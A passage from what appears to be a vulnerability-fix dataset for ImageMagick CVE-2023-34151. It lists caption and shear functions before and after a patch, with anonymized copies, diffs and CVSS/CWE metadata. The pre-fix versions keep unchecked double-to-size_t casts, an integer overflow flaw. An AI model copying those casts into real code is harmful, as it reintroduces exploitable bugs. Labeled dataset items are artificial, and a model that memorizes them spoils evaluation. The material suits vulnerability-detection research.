  assert(VAR_1->signature == VAR_15);
  assert(VAR_3 != (ExceptionInfo *) NULL);
  assert(VAR_3->signature == VAR_15);
  if (IsEventLogging() != VAR_16)
    (void) LogMagickEvent(VAR_17,GetMagickModule(),""%s"",VAR_1->filename);
  VAR_7=fmod(VAR_2,360.0);
  if (VAR_7 < -45.0)
    VAR_7+=360.0;
  for (VAR_12=0; VAR_7 > 45.0; VAR_12++)
    VAR_7-=90.0;
  VAR_12%=4;
  /* COMMENT_3 */
                              
    
  VAR_4=IntegralRotateImage(VAR_1,VAR_12,VAR_3);
  if (VAR_4 == (Image *) NULL)
    ThrowImageException(VAR_18,""MemoryAllocationFailed"");
  VAR_8.x=(-tan((double) DegreesToRadians(VAR_7)/2.0));
  VAR_8.y=sin((double) DegreesToRadians(VAR_7));
  if ((VAR_8.x == 0.0) && (VAR_8.y == 0.0))
    return(VAR_4);
  if (SetImageStorageClass(VAR_4,VAR_19,VAR_3) == VAR_16)
    {
      VAR_4=DestroyImage(VAR_4);
      return(VAR_4);
    }
  if (VAR_4->alpha_trait == VAR_20)
    (void) SetImageAlphaChannel(VAR_4,VAR_21,VAR_3);
  /* COMMENT_6 */
                                                  
    
  VAR_14=VAR_4->columns;
  VAR_11=VAR_4->rows;
  VAR_10.width=CastDoubleToUnsigned(fabs((double) VAR_11*VAR_8.x)+VAR_14+0.5);
  VAR_10.height=CastDoubleToUnsigned(fabs((double) VAR_10.width*VAR_8.y)+VAR_11+0.5);
  VAR_13=CastDoubleToUnsigned(fabs((double) VAR_10.height*VAR_8.x)+
    VAR_10.width+0.5);
  VAR_10.x=CastDoubleToLong(floor((double) ((VAR_13 > VAR_10.width) ?
    VAR_14 : VAR_10.width-VAR_13+2)/2.0+0.5));
  VAR_10.y=CastDoubleToLong(floor(((double) VAR_10.height-VAR_11+2)/2.0+0.5));
  /* COMMENT_9 */
                                 
    
  VAR_4->border_color=VAR_4->background_color;
  VAR_4->compose=VAR_22;
  VAR_9.width=(size_t) VAR_10.x;
  VAR_9.height=(size_t) VAR_10.y;
  VAR_5=BorderImage(VAR_4,&VAR_9,VAR_1->compose,
    VAR_3);
  VAR_4=DestroyImage(VAR_4);
  if (VAR_5 == (Image *) NULL)
    ThrowImageException(VAR_18,""MemoryAllocationFailed"");
  /* COMMENT_12 */
                     
    
  VAR_6=XShearImage(VAR_5,VAR_8.x,VAR_14,VAR_11,VAR_10.x,(ssize_t)
    (VAR_5->rows-VAR_11)/2,VAR_3);
  if (VAR_6 == VAR_16)
    {
      VAR_5=DestroyImage(VAR_5);
      return((Image *) NULL);
    }
  VAR_6=YShearImage(VAR_5,VAR_8.y,VAR_10.width,VAR_11,(ssize_t)
    (VAR_5->columns-VAR_10.width)/2,VAR_10.y,VAR_3);
  if (VAR_6 == VAR_16)
    {
      VAR_5=DestroyImage(VAR_5);
      return((Image *) NULL);
    }
  VAR_6=XShearImage(VAR_5,VAR_8.x,VAR_10.width,VAR_10.height,(ssize_t)
    (VAR_5->columns-VAR_10.width)/2,(ssize_t) (VAR_5->rows-
    VAR_10.height)/2,VAR_3);
  if (VAR_6 == VAR_16)
    {
      VAR_5=DestroyImage(VAR_5);
      return((Image *) NULL);
    }
  VAR_6=CropToFitImage(&VAR_5,VAR_8.x,VAR_8.y,(MagickRealType) VAR_14,
    (MagickRealType) VAR_11,VAR_23,VAR_3);
  VAR_5->alpha_trait=VAR_1->alpha_trait;
  VAR_5->compose=VAR_1->compose;
  VAR_5->page.width=0;
  VAR_5->page.height=0;
  if (VAR_6 == VAR_16)
    VAR_5=DestroyImage(VAR_5);
  return(VAR_5);
}",,"--- func_before
+++ func_after
@@ -61,9 +61,9 @@
   */
   width=integral_image->columns;
   height=integral_image->rows;
-  bounds.width=(size_t) floor(fabs((double) height*shear.x)+width+0.5);
-  bounds.height=(size_t) floor(fabs((double) bounds.width*shear.y)+height+0.5);
-  shear_width=(size_t) floor(fabs((double) bounds.height*shear.x)+
+  bounds.width=CastDoubleToUnsigned(fabs((double) height*shear.x)+width+0.5);
+  bounds.height=CastDoubleToUnsigned(fabs((double) bounds.width*shear.y)+height+0.5);
+  shear_width=CastDoubleToUnsigned(fabs((double) bounds.height*shear.x)+
     bounds.width+0.5);
   bounds.x=CastDoubleToLong(floor((double) ((shear_width > bounds.width) ?
     width : bounds.width-shear_width+2)/2.0+0.5));","{'deleted_lines': ['  bounds.width=(size_t) floor(fabs((double) height*shear.x)+width+0.5);', '  bounds.height=(size_t) floor(fabs((double) bounds.width*shear.y)+height+0.5);', '  shear_width=(size_t) floor(fabs((double) bounds.height*shear.x)+'], 'added_lines': ['  bounds.width=CastDoubleToUnsigned(fabs((double) height*shear.x)+width+0.5);', '  bounds.height=CastDoubleToUnsigned(fabs((double) bounds.width*shear.y)+height+0.5);', '  shear_width=CastDoubleToUnsigned(fabs((double) bounds.height*shear.x)+']}",True,"A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).",5.5,MEDIUM,1,valid,2023-05-18T01:06:15Z,4
CVE-2023-34151,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ImageMagick,properly cast double to size_t (https://github.com/ImageMagick/ImageMagick/issues/6341),3d6d98d8a2be30d74172ab43b5b8e874d2deb158,https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158,MagickCore/annotate.c,FormatMagickCaption,"MagickExport ssize_t FormatMagickCaption(Image *image,DrawInfo *draw_info,
const MagickBooleanType split,TypeMetric *metrics,char **caption,
ExceptionInfo *exception)
{
char
*p,
*q,
*s;
MagickBooleanType
status;
size_t
width;
ssize_t
i,
n;
q=draw_info->text;
s=(char *) NULL;
width=0;
for (p=(*caption); GetUTFCode(p) != 0; p+=GetUTFOctets(p))
{
int
code;
code=GetUTFCode(p);
if (code == '\n')
{
q=draw_info->text;
continue;
}
if ((draw_info->word_break != BreakWordBreakType) &&
(IsUTFSpace(code) != MagickFalse) &&
(IsNonBreakingUTFSpace(code) == MagickFalse))
{
s=p;
if (width > image->columns)
p=ReplaceSpaceWithNewline(caption,s);
}
for (i=0; i < (ssize_t) GetUTFOctets(p); i++)
*q++=(*(p+i));
*q='\0';
status=GetTypeMetrics(image,draw_info,metrics,exception);
if (status == MagickFalse)
break;
width=(size_t) floor(metrics->width+draw_info->stroke_width+0.5);
if (width <= image->columns)
continue;
if (s != (char *) NULL)
p=ReplaceSpaceWithNewline(caption,s);
else
if ((split != MagickFalse) || (GetUTFOctets(p) > 2))
{
n=p-(*caption);
if ((n > 0) && ((*caption)[n-1] != '\n'))
{
char
*target;
target=AcquireString(*caption);
CopyMagickString(target,*caption,n+1);
ConcatenateMagickString(target,""\n"",strlen(*caption)+1);
ConcatenateMagickString(target,p,strlen(*caption)+2);
(void) DestroyString(*caption);
*caption=target;
p=(*caption)+n;
}
}
q=draw_info->text;
s=(char *) NULL;
}
n=0;
for (p=(*caption); GetUTFCode(p) != 0; p+=GetUTFOctets(p))
if (GetUTFCode(p) == '\n')
n++;
return(n);
}","MagickExport VAR_0 FormatMagickCaption(Image *VAR_1,DrawInfo *VAR_2,
const MagickBooleanType VAR_3,TypeMetric *VAR_4,char **VAR_5,
ExceptionInfo *VAR_6)
{
char
*VAR_7,
*VAR_8,
*VAR_9;
MagickBooleanType
VAR_10;
size_t
VAR_11;
ssize_t
VAR_12,
VAR_13;
VAR_8=VAR_2->text;
VAR_9=(char *) NULL;
VAR_11=0;
for (VAR_7=(*VAR_5); GetUTFCode(VAR_7) != 0; VAR_7+=GetUTFOctets(VAR_7))
{
int
VAR_14;
VAR_14=GetUTFCode(VAR_7);
if (VAR_14 == '\n')
{
VAR_8=VAR_2->text;
continue;
}
if ((VAR_2->word_break != VAR_15) &&
(IsUTFSpace(VAR_14) != VAR_16) &&
(IsNonBreakingUTFSpace(VAR_14) == VAR_16))
{
VAR_9=VAR_7;
if (VAR_11 > VAR_1->columns)
VAR_7=ReplaceSpaceWithNewline(VAR_5,VAR_9);
}
for (VAR_12=0; VAR_12 < (ssize_t) GetUTFOctets(VAR_7); VAR_12++)
*VAR_8++=(*(VAR_7+VAR_12));
*VAR_8='\0';
VAR_10=GetTypeMetrics(VAR_1,VAR_2,VAR_4,VAR_6);
if (VAR_10 == VAR_16)
break;
VAR_11=(size_t) floor(VAR_4->width+VAR_2->stroke_width+0.5);
if (VAR_11 <= VAR_1->columns)
continue;
if (VAR_9 != (char *) NULL)
VAR_7=ReplaceSpaceWithNewline(VAR_5,VAR_9);
else
if ((VAR_3 != VAR_16) || (GetUTFOctets(VAR_7) > 2))
{
VAR_13=VAR_7-(*VAR_5);
if ((VAR_13 > 0) && ((*VAR_5)[VAR_13-1] != '\n'))
{
char
*VAR_17;
VAR_17=AcquireString(*VAR_5);
CopyMagickString(VAR_17,*VAR_5,VAR_13+1);
ConcatenateMagickString(VAR_17,""\n"",strlen(*VAR_5)+1);
ConcatenateMagickString(VAR_17,VAR_7,strlen(*VAR_5)+2);
(void) DestroyString(*VAR_5);
*VAR_5=VAR_17;
VAR_7=(*VAR_5)+VAR_13;
}
}
VAR_8=VAR_2->text;
VAR_9=(char *) NULL;
}
VAR_13=0;
for (VAR_7=(*VAR_5); GetUTFCode(VAR_7) != 0; VAR_7+=GetUTFOctets(VAR_7))
if (GetUTFCode(VAR_7) == '\n')
VAR_13++;
return(VAR_13);
}",,"MagickExport ssize_t FormatMagickCaption(Image *image,DrawInfo *draw_info,
  const MagickBooleanType split,TypeMetric *metrics,char **caption,
  ExceptionInfo *exception)
{
  char
    *p,
    *q,
    *s;

  MagickBooleanType
    status;

  size_t
    width;

  ssize_t
    i,
    n;

  q=draw_info->text;
  s=(char *) NULL;
  width=0;
  for (p=(*caption); GetUTFCode(p) != 0; p+=GetUTFOctets(p))
  {
    int
      code;

    code=GetUTFCode(p);
    if (code == '\n')
      {
        q=draw_info->text;
        continue;
      }
    if ((draw_info->word_break != BreakWordBreakType) &&
        (IsUTFSpace(code) != MagickFalse) &&
        (IsNonBreakingUTFSpace(code) == MagickFalse))
      {
        s=p;
        if (width > image->columns)
          p=ReplaceSpaceWithNewline(caption,s);
      }
    for (i=0; i < (ssize_t) GetUTFOctets(p); i++)
      *q++=(*(p+i));
    *q='\0';
    status=GetTypeMetrics(image,draw_info,metrics,exception);
    if (status == MagickFalse)
      break;
    width=CastDoubleToUnsigned(metrics->width+draw_info->stroke_width+0.5);
    if (width <= image->columns)
      continue;
    if (s != (char *) NULL)
      p=ReplaceSpaceWithNewline(caption,s);
    else
      if ((split != MagickFalse) || (GetUTFOctets(p) > 2))
        {
          /*
            No convenient line breaks-- insert newline.
          */
          n=p-(*caption);
          if ((n > 0) && ((*caption)[n-1] != '\n'))
            {
              char
                *target;

              target=AcquireString(*caption);
              CopyMagickString(target,*caption,n+1);
              ConcatenateMagickString(target,""\n"",strlen(*caption)+1);
              ConcatenateMagickString(target,p,strlen(*caption)+2);
              (void) DestroyString(*caption);
              *caption=target;
              p=(*caption)+n;
            }
        }
    q=draw_info->text;
    s=(char *) NULL;
  }
  n=0;
  for (p=(*caption); GetUTFCode(p) != 0; p+=GetUTFOctets(p))
    if (GetUTFCode(p) == '\n')
      n++;
  return(n);
}","MagickExport VAR_0 FormatMagickCaption(Image *VAR_1,DrawInfo *VAR_2,
  const MagickBooleanType VAR_3,TypeMetric *VAR_4,char **VAR_5,
  ExceptionInfo *VAR_6)
{
  char
    *VAR_7,
    *VAR_8,
    *VAR_9;

  MagickBooleanType
    VAR_10;

  size_t
    VAR_11;

  ssize_t
    VAR_12,
    VAR_13;

  VAR_8=VAR_2->text;
  VAR_9=(char *) NULL;
  VAR_11=0;
  for (VAR_7=(*VAR_5); GetUTFCode(VAR_7) != 0; VAR_7+=GetUTFOctets(VAR_7))
  {
    int
      VAR_14;

    VAR_14=GetUTFCode(VAR_7);
    if (VAR_14 == '\n')
      {
        VAR_8=VAR_2->text;
        continue;
      }
    if ((VAR_2->word_break != VAR_15) &&
        (IsUTFSpace(VAR_14) != VAR_16) &&
        (IsNonBreakingUTFSpace(VAR_14) == VAR_16))
      {
        VAR_9=VAR_7;
        if (VAR_11 > VAR_1->columns)
          VAR_7=ReplaceSpaceWithNewline(VAR_5,VAR_9);
      }
    for (VAR_12=0; VAR_12 < (ssize_t) GetUTFOctets(VAR_7); VAR_12++)
      *VAR_8++=(*(VAR_7+VAR_12));
    *VAR_8='\0';
    VAR_10=GetTypeMetrics(VAR_1,VAR_2,VAR_4,VAR_6);
    if (VAR_10 == VAR_16)
      break;
    VAR_11=CastDoubleToUnsigned(VAR_4->width+VAR_2->stroke_width+0.5);
    if (VAR_11 <= VAR_1->columns)
      continue;
    if (VAR_9 != (char *) NULL)
      VAR_7=ReplaceSpaceWithNewline(VAR_5,VAR_9);
    else
      if ((VAR_3 != VAR_16) || (GetUTFOctets(VAR_7) > 2))
        {
          /* COMMENT_0 */
                                                       
            
          VAR_13=VAR_7-(*VAR_5);
          if ((VAR_13 > 0) && ((*VAR_5)[VAR_13-1] != '\n'))
            {
              char
                *VAR_17;

              VAR_17=AcquireString(*VAR_5);
              CopyMagickString(VAR_17,*VAR_5,VAR_13+1);
              ConcatenateMagickString(VAR_17,""\n"",strlen(*VAR_5)+1);
              ConcatenateMagickString(VAR_17,VAR_7,strlen(*VAR_5)+2);
              (void) DestroyString(*VAR_5);
              *VAR_5=VAR_17;
              VAR_7=(*VAR_5)+VAR_13;
            }
        }
    VAR_8=VAR_2->text;
    VAR_9=(char *) NULL;
  }
  VAR_13=0;
  for (VAR_7=(*VAR_5); GetUTFCode(VAR_7) != 0; VAR_7+=GetUTFOctets(VAR_7))
    if (GetUTFCode(VAR_7) == '\n')
      VAR_13++;
  return(VAR_13);
}",,"--- func_before
+++ func_after
@@ -45,7 +45,7 @@
     status=GetTypeMetrics(image,draw_info,metrics,exception);
     if (status == MagickFalse)
       break;
-    width=(size_t) floor(metrics->width+draw_info->stroke_width+0.5);
+    width=CastDoubleToUnsigned(metrics->width+draw_info->stroke_width+0.5);
     if (width <= image->columns)
       continue;
     if (s != (char *) NULL)","{'deleted_lines': ['    width=(size_t) floor(metrics->width+draw_info->stroke_width+0.5);'], 'added_lines': ['    width=CastDoubleToUnsigned(metrics->width+draw_info->stroke_width+0.5);']}",True,"A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).",5.5,MEDIUM,1,valid,2023-05-18T01:06:15Z,4
CVE-2023-34151,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ImageMagick,properly cast double to size_t (https://github.com/ImageMagick/ImageMagick/issues/6341),3d6d98d8a2be30d74172ab43b5b8e874d2deb158,https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158,coders/caption.c,ReadCAPTIONImage,"static Image *ReadCAPTIONImage(const ImageInfo *image_info,
ExceptionInfo *exception)
{
char
*caption,
geometry[MagickPathExtent],
*text;
const char
*gravity,
*option;
DrawInfo
*draw_info;
Image
*image;
MagickBooleanType
left_bearing,
split,
status;
size_t
height,
width;
ssize_t
i;
TypeMetric
metrics;
assert(image_info != (const ImageInfo *) NULL);
assert(image_info->signature == MagickCoreSignature);
assert(exception != (ExceptionInfo *) NULL);
assert(exception->signature == MagickCoreSignature);
if (IsEventLogging() != MagickFalse)
(void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",
image_info->filename);
image=AcquireImage(image_info,exception);
(void) ResetImagePage(image,""0x0+0+0"");
if ((image->columns != 0) && (image->rows != 0))
(void) SetImageBackgroundColor(image,exception);
option=GetImageOption(image_info,""filename"");
if (option == (const char *) NULL)
caption=InterpretImageProperties((ImageInfo *) image_info,image,
image_info->filename,exception);
else
if (LocaleNCompare(option,""caption:"",8) == 0)
caption=InterpretImageProperties((ImageInfo *) image_info,image,option+8,
exception);
else
caption=InterpretImageProperties((ImageInfo *) image_info,image,option,
exception);
if (caption == (char *) NULL)
return(DestroyImageList(image));
(void) SetImageProperty(image,""caption"",caption,exception);
draw_info=CloneDrawInfo(image_info,(DrawInfo *) NULL);
width=(size_t) floor(0.5*draw_info->pointsize*strlen(caption)+0.5);
if (AcquireMagickResource(WidthResource,width) == MagickFalse)
{
caption=DestroyString(caption);
draw_info=DestroyDrawInfo(draw_info);
ThrowReaderException(ImageError,""WidthOrHeightExceedsLimit"");
}
(void) CloneString(&draw_info->text,caption);
gravity=GetImageOption(image_info,""gravity"");
if (gravity != (char *) NULL)
draw_info->gravity=(GravityType) ParseCommandOption(MagickGravityOptions,
MagickFalse,gravity);
split=IsStringTrue(GetImageOption(image_info,""caption:split""));
status=MagickTrue;
(void) memset(&metrics,0,sizeof(metrics));
if (image->columns == 0)
{
text=AcquireString(caption);
i=FormatMagickCaption(image,draw_info,split,&metrics,&text,exception);
AdjustTypeMetricBounds(&metrics);
(void) CloneString(&draw_info->text,text);
text=DestroyString(text);
(void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
metrics.bounds.x1,metrics.ascent);
if (draw_info->gravity == UndefinedGravity)
(void) CloneString(&draw_info->geometry,geometry);
status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
AdjustTypeMetricBounds(&metrics);
image->columns=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
}
if (image->rows == 0)
{
split=MagickTrue;
text=AcquireString(caption);
i=FormatMagickCaption(image,draw_info,split,&metrics,&text,exception);
AdjustTypeMetricBounds(&metrics);
(void) CloneString(&draw_info->text,text);
text=DestroyString(text);
(void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
metrics.bounds.x1,metrics.ascent);
if (draw_info->gravity == UndefinedGravity)
(void) CloneString(&draw_info->geometry,geometry);
status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
AdjustTypeMetricBounds(&metrics);
image->rows=(size_t) ((i+1)*(metrics.ascent-metrics.descent+
draw_info->interline_spacing+draw_info->stroke_width)+0.5);
}
if (status != MagickFalse)
status=SetImageExtent(image,image->columns,image->rows,exception);
if (status == MagickFalse)
{ 
caption=DestroyString(caption);
draw_info=DestroyDrawInfo(draw_info);
return(DestroyImageList(image));
}
if (SetImageBackgroundColor(image,exception) == MagickFalse)
{
caption=DestroyString(caption);
draw_info=DestroyDrawInfo(draw_info);
image=DestroyImageList(image);
return((Image *) NULL);
}
if ((fabs(image_info->pointsize) < MagickEpsilon) && (strlen(caption) > 0))
{
double
high,
low;
ssize_t
n;
low=1.0;
option=GetImageOption(image_info,""caption:max-pointsize"");
if (option != (const char*) NULL)
{
high=StringToDouble(option,(char**) NULL);
if (high < 1.0)
high=1.0;
high+=1.0;
}
else
{
option=GetImageOption(image_info,""caption:start-pointsize"");
if (option != (const char *) NULL)
{
draw_info->pointsize=StringToDouble(option,(char**) NULL);
if (draw_info->pointsize < 1.0)
draw_info->pointsize=1.0;
}
for (n=0; n < 32; n++, draw_info->pointsize*=2.0)
{
text=AcquireString(caption);
i=FormatMagickCaption(image,draw_info,split,&metrics,&text,
exception);
AdjustTypeMetricBounds(&metrics);
(void) CloneString(&draw_info->text,text);
text=DestroyString(text);
(void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
metrics.bounds.x1,metrics.ascent);
if (draw_info->gravity == UndefinedGravity)
(void) CloneString(&draw_info->geometry,geometry);
status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
if (status == MagickFalse)
break;
AdjustTypeMetricBounds(&metrics);
width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
height=(size_t) floor(metrics.height-metrics.underline_position+
draw_info->interline_spacing+draw_info->stroke_width+0.5);
if ((image->columns != 0) && (image->rows != 0))
{
if ((width >= image->columns) || (height >= image->rows))
break;
if ((width < image->columns) && (height < image->rows))
low=draw_info->pointsize;
}
else
if (((image->columns != 0) && (width >= image->columns)) ||
((image->rows != 0) && (height >= image->rows)))
break;
}
high=draw_info->pointsize;
}
while ((high-low) > 0.5)
{
draw_info->pointsize=(low+high)/2.0;
text=AcquireString(caption);
i=FormatMagickCaption(image,draw_info,split,&metrics,&text,exception);
AdjustTypeMetricBounds(&metrics);
(void) CloneString(&draw_info->text,text);
text=DestroyString(text);
(void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
metrics.bounds.x1,metrics.ascent);
if (draw_info->gravity == UndefinedGravity)
(void) CloneString(&draw_info->geometry,geometry);
status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
if (status == MagickFalse)
break;
AdjustTypeMetricBounds(&metrics);
width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
height=(size_t) floor(metrics.height-metrics.underline_position+
draw_info->interline_spacing+draw_info->stroke_width+0.5);
if ((image->columns != 0) && (image->rows != 0))
{
if ((width < image->columns) && (height < image->rows))
low=draw_info->pointsize+0.5;
else
high=draw_info->pointsize-0.5;
}
else
if (((image->columns != 0) && (width < image->columns)) ||
((image->rows != 0) && (height < image->rows)))
low=draw_info->pointsize+0.5;
else
high=draw_info->pointsize-0.5;
}
draw_info->pointsize=floor((low+high)/2.0-0.5);
}
i=FormatMagickCaption(image,draw_info,split,&metrics,&caption,exception);
AdjustTypeMetricBounds(&metrics);
(void) CloneString(&draw_info->text,caption);
caption=DestroyString(caption);
left_bearing=((draw_info->gravity == UndefinedGravity) ||
(draw_info->gravity == NorthWestGravity) || 
(draw_info->gravity == WestGravity) ||
(draw_info->gravity == SouthWestGravity)) ? MagickTrue : MagickFalse;
(void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
(draw_info->direction == RightToLeftDirection ? (double) image->columns-
(draw_info->gravity == UndefinedGravity ? metrics.bounds.x2 : 0.0) : 
(left_bearing != MagickFalse ? metrics.bounds.x1 : 0.0)),
(draw_info->gravity == UndefinedGravity ? 
MagickMax(metrics.ascent,metrics.bounds.y2) : 0.0));
(void) CloneString(&draw_info->geometry,geometry);
status=AnnotateImage(image,draw_info,exception);
if (image_info->pointsize == 0.0)
(void) FormatImageProperty(image,""caption:pointsize"",""%.*g"",
GetMagickPrecision(),draw_info->pointsize);
(void) FormatImageProperty(image,""caption:lines"",""%.*g"",GetMagickPrecision(),
(double) (i+1));
draw_info=DestroyDrawInfo(draw_info);
if (status == MagickFalse)
{
image=DestroyImageList(image);
return((Image *) NULL);
}
return(GetFirstImageInList(image));
}","static Image *ReadCAPTIONImage(const ImageInfo *VAR_0,
ExceptionInfo *VAR_1)
{
char
*VAR_2,
VAR_3[VAR_4],
*VAR_5;
const char
*VAR_6,
*VAR_7;
DrawInfo
*VAR_8;
Image
*VAR_9;
MagickBooleanType
VAR_10,
VAR_11,
VAR_12;
size_t
VAR_13,
VAR_14;
ssize_t
VAR_15;
TypeMetric
VAR_16;
assert(VAR_0 != (const ImageInfo *) NULL);
assert(VAR_0->signature == VAR_17);
assert(VAR_1 != (ExceptionInfo *) NULL);
assert(VAR_1->signature == VAR_17);
if (IsEventLogging() != VAR_18)
(void) LogMagickEvent(VAR_19,GetMagickModule(),""%s"",
VAR_0->filename);
VAR_9=AcquireImage(VAR_0,VAR_1);
(void) ResetImagePage(VAR_9,""0x0+0+0"");
if ((VAR_9->columns != 0) && (VAR_9->rows != 0))
(void) SetImageBackgroundColor(VAR_9,VAR_1);
VAR_7=GetImageOption(VAR_0,""filename"");
if (VAR_7 == (const char *) NULL)
VAR_2=InterpretImageProperties((ImageInfo *) VAR_0,VAR_9,
VAR_0->filename,VAR_1);
else
if (LocaleNCompare(VAR_7,""caption:"",8) == 0)
VAR_2=InterpretImageProperties((ImageInfo *) VAR_0,VAR_9,VAR_7+8,
VAR_1);
else
VAR_2=InterpretImageProperties((ImageInfo *) VAR_0,VAR_9,VAR_7,
VAR_1);
if (VAR_2 == (char *) NULL)
return(DestroyImageList(VAR_9));
(void) SetImageProperty(VAR_9,""caption"",VAR_2,VAR_1);
VAR_8=CloneDrawInfo(VAR_0,(DrawInfo *) NULL);
VAR_14=(size_t) floor(0.5*VAR_8->pointsize*strlen(VAR_2)+0.5);
if (AcquireMagickResource(VAR_20,VAR_14) == VAR_18)
{
VAR_2=DestroyString(VAR_2);
VAR_8=DestroyDrawInfo(VAR_8);
ThrowReaderException(VAR_21,""WidthOrHeightExceedsLimit"");
}
(void) CloneString(&VAR_8->text,VAR_2);
VAR_6=GetImageOption(VAR_0,""gravity"");
if (VAR_6 != (char *) NULL)
VAR_8->gravity=(GravityType) ParseCommandOption(VAR_22,
VAR_18,VAR_6);
VAR_11=IsStringTrue(GetImageOption(VAR_0,""caption:split""));
VAR_12=VAR_23;
(void) memset(&VAR_16,0,sizeof(VAR_16));
if (VAR_9->columns == 0)
{
VAR_5=AcquireString(VAR_2);
VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_5,VAR_1);
AdjustTypeMetricBounds(&VAR_16);
(void) CloneString(&VAR_8->text,VAR_5);
VAR_5=DestroyString(VAR_5);
(void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
VAR_16.bounds.x1,VAR_16.ascent);
if (VAR_8->gravity == VAR_24)
(void) CloneString(&VAR_8->geometry,VAR_3);
VAR_12=GetMultilineTypeMetrics(VAR_9,VAR_8,&VAR_16,VAR_1);
AdjustTypeMetricBounds(&VAR_16);
VAR_9->columns=(size_t) floor(VAR_16.width+VAR_8->stroke_width+0.5);
}
if (VAR_9->rows == 0)
{
VAR_11=VAR_23;
VAR_5=AcquireString(VAR_2);
VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_5,VAR_1);
AdjustTypeMetricBounds(&VAR_16);
(void) CloneString(&VAR_8->text,VAR_5);
VAR_5=DestroyString(VAR_5);
(void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
VAR_16.bounds.x1,VAR_16.ascent);
if (VAR_8->gravity == VAR_24)
(void) CloneString(&VAR_8->geometry,VAR_3);
VAR_12=GetMultilineTypeMetrics(VAR_9,VAR_8,&VAR_16,VAR_1);
AdjustTypeMetricBounds(&VAR_16);
VAR_9->rows=(size_t) ((VAR_15+1)*(VAR_16.ascent-VAR_16.descent+
VAR_8->interline_spacing+VAR_8->stroke_width)+0.5);
}
if (VAR_12 != VAR_18)
VAR_12=SetImageExtent(VAR_9,VAR_9->columns,VAR_9->rows,VAR_1);
if (VAR_12 == VAR_18)
{ 
VAR_2=DestroyString(VAR_2);
VAR_8=DestroyDrawInfo(VAR_8);
return(DestroyImageList(VAR_9));
}
if (SetImageBackgroundColor(VAR_9,VAR_1) == VAR_18)
{
VAR_2=DestroyString(VAR_2);
VAR_8=DestroyDrawInfo(VAR_8);
VAR_9=DestroyImageList(VAR_9);
return((Image *) NULL);
}
if ((fabs(VAR_0->pointsize) < VAR_25) && (strlen(VAR_2) > 0))
{
double
VAR_26,
VAR_27;
ssize_t
VAR_28;
VAR_27=1.0;
VAR_7=GetImageOption(VAR_0,""caption:max-pointsize"");
if (VAR_7 != (const char*) NULL)
{
VAR_26=StringToDouble(VAR_7,(char**) NULL);
if (VAR_26 < 1.0)
VAR_26=1.0;
VAR_26+=1.0;
}
else
{
VAR_7=GetImageOption(VAR_0,""caption:start-pointsize"");
if (VAR_7 != (const char *) NULL)
{
VAR_8->pointsize=StringToDouble(VAR_7,(char**) NULL);
if (VAR_8->pointsize < 1.0)
VAR_8->pointsize=1.0;
}
for (VAR_28=0; VAR_28 < 32; VAR_28++, VAR_8->pointsize*=2.0)
{
VAR_5=AcquireString(VAR_2);
VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_5,
VAR_1);
AdjustTypeMetricBounds(&VAR_16);
(void) CloneString(&VAR_8->text,VAR_5);
VAR_5=DestroyString(VAR_5);
(void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
VAR_16.bounds.x1,VAR_16.ascent);
if (VAR_8->gravity == VAR_24)
(void) CloneString(&VAR_8->geometry,VAR_3);
VAR_12=GetMultilineTypeMetrics(VAR_9,VAR_8,&VAR_16,VAR_1);
if (VAR_12 == VAR_18)
break;
AdjustTypeMetricBounds(&VAR_16);
VAR_14=(size_t) floor(VAR_16.width+VAR_8->stroke_width+0.5);
VAR_13=(size_t) floor(VAR_16.height-VAR_16.underline_position+
VAR_8->interline_spacing+VAR_8->stroke_width+0.5);
if ((VAR_9->columns != 0) && (VAR_9->rows != 0))
{
if ((VAR_14 >= VAR_9->columns) || (VAR_13 >= VAR_9->rows))
break;
if ((VAR_14 < VAR_9->columns) && (VAR_13 < VAR_9->rows))
VAR_27=VAR_8->pointsize;
}
else
if (((VAR_9->columns != 0) && (VAR_14 >= VAR_9->columns)) ||
((VAR_9->rows != 0) && (VAR_13 >= VAR_9->rows)))
break;
}
VAR_26=VAR_8->pointsize;
}
while ((VAR_26-VAR_27) > 0.5)
{
VAR_8->pointsize=(VAR_27+VAR_26)/2.0;
VAR_5=AcquireString(VAR_2);
VAR_15=FormatMagickCaption(VAR_9,VAR_8,VAR_11,&VAR_16,&VAR_5,VAR_1);
AdjustTypeMetricBounds(&VAR_16);
(void) CloneString(&VAR_8->text,VAR_5);
VAR_5=DestroyString(VAR_5);
(void) FormatLocaleString(VAR_3,VAR_4,""%+g%+g"",
VAR_16.bounds.x1,VAR_16.ascent);
if (VAR_8->gravity == VAR_24)
(void) CloneString(&VAR_8->geometry,VAR_3);
VAR_12=GetMultilineTypeMetrics(VAR_9,VAR_8,&VAR_16,VAR_1);
if (VAR_12 == VAR_18)
break;
AdjustTypeMetricBounds(&VAR_16);
